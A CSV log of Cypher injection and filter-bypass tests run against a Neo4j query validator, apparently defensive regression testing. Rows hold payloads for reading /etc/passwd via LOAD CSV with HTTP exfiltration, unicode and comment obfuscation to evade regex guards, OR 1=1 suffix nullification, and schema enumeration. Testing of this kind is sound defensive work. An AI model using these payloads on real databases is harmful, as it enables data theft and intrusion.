Technique,Cypher,Result,Blocked_By,Notes
[POST-FIX] Unicode apoc.cypher namespace bypass,"RETURN apoc.cyph\u0065r.runFirstColumnSingle('SHOW SETTINGS YIELD name RETURN count(*)', {}) AS count",BLOCKED,Unicode-normalized SSRF regex,Fix verified through MCP after service restart
Noisy block comments as whitespace for write,"MATCH/*asdrg*/(n)/*gdsefds*/WITH/*assdgs*/true/*x*/AS/*y*/ignored/*z*/CREATE/*w*/(:SeizuFuzzProbe {source:'noisy_comment_write'})",BLOCKED,EXPLAIN write check,"HackMD notes block comments can replace whitespace; Neo4j still classifies the decoded query as write"
UNION null trailing LIMIT read amplification,"MATCH (n) RETURN n AS item LIMIT 0 UNION MATCH (m) RETURN m AS item LIMIT 1 //",EXECUTED — returned one node,Nothing,"Read-only UNION can bypass a hardcoded trailing LIMIT pattern in vulnerable concatenated queries; not a Seizu write/admin bypass because graph__query accepts whole read queries"
Chained file-to-http LOAD CSV exfil,"LOAD/*random*/CSV FROM 'file:///etc/passwd' AS row LOAD/*more*/CSV FROM 'http://127.0.0.1:1/'+row[0] AS leak RETURN ''",BLOCKED,Comment-stripped SSRF regex,"HackMD chained LOAD CSV file read plus HTTP exfil pattern; comment noise did not bypass"
Unicode plus comment LOAD CSV file read,"LO\u0041D/*random*/CSV FROM 'file:///etc/passwd' AS row RETURN row LIMIT 1",BLOCKED,Unicode-normalized/comment-stripped SSRF regex,"Combines HackMD comment-whitespace trick with Neo4j unicode keyword resolution"
Unicode CSV token in LOAD CSV,"LOAD/*random*/CS\u0056 FROM 'file:///etc/passwd' AS row RETURN row LIMIT 1",BLOCKED,Unicode-normalized/comment-stripped SSRF regex,"Unicode escape in CSV token is normalized before scanning"
Unclosed block comment nulls suffix — broad read,"MATCH (n) WHERE n.name =~ '' OR 1=1 RETURN n/*' RETURN n LIMIT 5 /*Only return 5 results*/",EXECUTED — MCP request failed after broad result set,Nothing,"HackMD suffix-nullification trick; removed trailing LIMIT and attempted to return all nodes. Read-only but caused transport failure due result size"
Unclosed block comment nulls suffix — count probe,"MATCH (n) WHERE n.name =~ '' OR 1=1 RETURN count(n) AS total/*' RETURN n LIMIT 5 /*Only return 5 results*/",EXECUTED — returned node count,Nothing,"Same suffix-nullification pattern but safe count projection; confirms parser uses the later block-comment terminator"
Inline comment nulls trailing LIMIT — count probe,"MATCH (n) WHERE n.is_active = 1 OR 1=1 RETURN count(n) AS total// RETURN n LIMIT 0",EXECUTED — returned node count,Nothing,"Inline comment removes trailing LIMIT in concatenated-query pattern; read-only information disclosure/read amplification, not write/admin"
CALL db.labels enumeration,"MATCH (n) WHERE n.id=1 OR 1=1 WITH 1337 AS x CALL db.labels() YIELD label AS d RETURN d LIMIT 5",EXECUTED — returned labels,Nothing,"HackMD recommends db.labels() for easy data mapping; allowed as read-only metadata, separate from admin SHOW PROCEDURES/SETTINGS guard"
APOC text join read aggregation,"MATCH (n) RETURN apoc.text.join(collect(head(labels(n)))[0..10], ',') AS labels_sample",EXECUTED — returned aggregated labels,Nothing,"APOC pure functions remain allowed; useful for compact read aggregation but not a write/admin or SSRF vector"
CALL dbms.components version metadata,"CALL dbms.components() YIELD name, versions, edition RETURN name, versions, edition",BLOCKED,EXPLAIN write check,"Qiita version-fingerprinting primitive; direct DBMS procedure remains blocked"
Unicode CALL dbms.components,"C\u0041LL dbms.components() YIELD name, versions, edition RETURN name, versions, edition",BLOCKED,EXPLAIN write check,"Unicode CALL does not bypass because Neo4j EXPLAIN classifies the decoded DBMS procedure as non-read"
CALL dbms.components plus LOAD CSV exfil,"CALL dbms.components() YIELD name, versions, edition UNWIND versions AS version LOAD CSV FROM 'http://127.0.0.1:1/?version=' + version + '&name=' + name + '&edition=' + edition AS l RETURN 0 AS _0",BLOCKED,EXPLAIN write check or SSRF regex,"Qiita version exfil pattern; blocked before execution"
CALL dbms.components plus unicode/comment LOAD CSV exfil,"CALL dbms.components() YIELD name, versions, edition UNWIND versions AS version LO\u0041D/*noise*/CSV FROM 'http://127.0.0.1:1/?version=' + version + '&name=' + name + '&edition=' + edition AS l RETURN 0 AS _0",BLOCKED,EXPLAIN write check or unicode-normalized SSRF regex,"Mixed unicode/comment version of Qiita exfil pattern remains blocked"
Dynamic property dump via keys(),"MATCH (f:GitHubUser) WITH f LIMIT 1 UNWIND keys(f) AS p RETURN p, f[p] AS value LIMIT 10",EXECUTED — returned selected node properties,Nothing,"Qiita keys(f)/f[p] property enumeration works as ordinary read access; not a validator bypass but can expose sensitive graph data to query-capable users"
Dynamic property dump with LOAD CSV exfil,"MATCH (f:GitHubUser) WITH f LIMIT 1 UNWIND keys(f) AS p LOAD CSV FROM 'http://127.0.0.1:1/?' + p + '=' + toString(f[p]) AS l RETURN 0 AS _0",BLOCKED,SSRF regex,"Network exfiltration version of keys(f)/f[p] pattern is blocked"
Dynamic property dump with unicode/comment LOAD CSV exfil,"MATCH (f:GitHubUser) WITH f LIMIT 1 UNWIND keys(f) AS p LO\u0041D/*noise*/CSV FROM 'http://127.0.0.1:1/?' + p + '=' + toString(f[p]) AS l RETURN 0 AS _0",BLOCKED,Unicode-normalized/comment-stripped SSRF regex,"Unicode/comment obfuscation does not bypass the LOAD CSV guard"
Property key enumeration procedure,"CALL db.propertyKeys() YIELD propertyKey RETURN propertyKey LIMIT 10",EXECUTED — returned property keys,Nothing,"Read-only metadata enumeration remains allowed"
Node schema property enumeration procedure,"CALL db.schema.nodeTypeProperties() YIELD nodeType, propertyName, propertyTypes RETURN nodeType, propertyName, propertyTypes LIMIT 10",EXECUTED — returned node property schema,Nothing,"Read-only schema metadata enumeration remains allowed"
Relationship schema property enumeration procedure,"CALL db.schema.relTypeProperties() YIELD relType, propertyName, propertyTypes RETURN relType, propertyName, propertyTypes LIMIT 10",EXECUTED — returned relationship property schema,Nothing,"Read-only schema metadata enumeration remains allowed"
Comment ReDoS shape LOAD CSV,"LOAD /*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/**/ CSV FROM 'http://127.0.0.1:1/' AS row RETURN row",BLOCKED,Linear comment scanner plus SSRF regex,"Regression for CodeQL polynomial-regex finding; repeated a/* block-comment starts do not hang and LOAD CSV is blocked"
Comment ReDoS shape SHOW SETTINGS,"SHOW /*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/**/ SETTINGS YIELD name, value RETURN name, value LIMIT 1",BLOCKED,Linear comment scanner plus admin regex,"Repeated a/* block-comment starts do not hang and admin SHOW is blocked"
Line comment between SHOW tokens,"SHOW // comment between admin tokens\nSETTINGS YIELD name, value RETURN name, value LIMIT 1",BLOCKED,Linear comment scanner plus admin regex,"Line comments are treated as whitespace between admin command tokens"
Comment ReDoS shape TERMINATE,"TERMINATE /*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/*a/**/ TRANSACTION 'neo4j-transaction-0' YIELD transactionId, message RETURN transactionId, message",BLOCKED,Linear comment scanner plus admin regex,"Repeated a/* block-comment starts do not hang and TERMINATE is blocked"
Line comment between LOAD CSV tokens,"LOAD // comment between LOAD and CSV\nCSV FROM 'http://127.0.0.1:1/' AS row RETURN row",BLOCKED,Linear comment scanner plus SSRF regex,"Line comments are treated as whitespace between LOAD and CSV"
Block comment inside LOAD keyword,"LO/*comment*/AD CSV FROM 'http://127.0.0.1:1/' AS row RETURN row",BLOCKED,EXPLAIN syntax error,"Neo4j does not accept comments inside the LOAD keyword; not exploitable"
Block comment inside SHOW keyword,"SH/*comment*/OW SETTINGS YIELD name, value RETURN name, value LIMIT 1",BLOCKED,EXPLAIN syntax error,"Neo4j does not accept comments inside the SHOW keyword; not exploitable"
Unicode keyword plus block comment,"SH\u004fW /*unicode keyword plus comments*/ SETTINGS YIELD name, value RETURN name, value LIMIT 1",BLOCKED,Unicode-normalized/comment-stripped admin regex,"Combination of unicode keyword obfuscation and block comments remains blocked"
Unterminated block comment after LOAD,"LOAD /* unterminated comment CSV FROM 'http://127.0.0.1:1/' AS row RETURN row",BLOCKED,EXPLAIN lexical error,"Neo4j rejects unterminated block comments before execution"
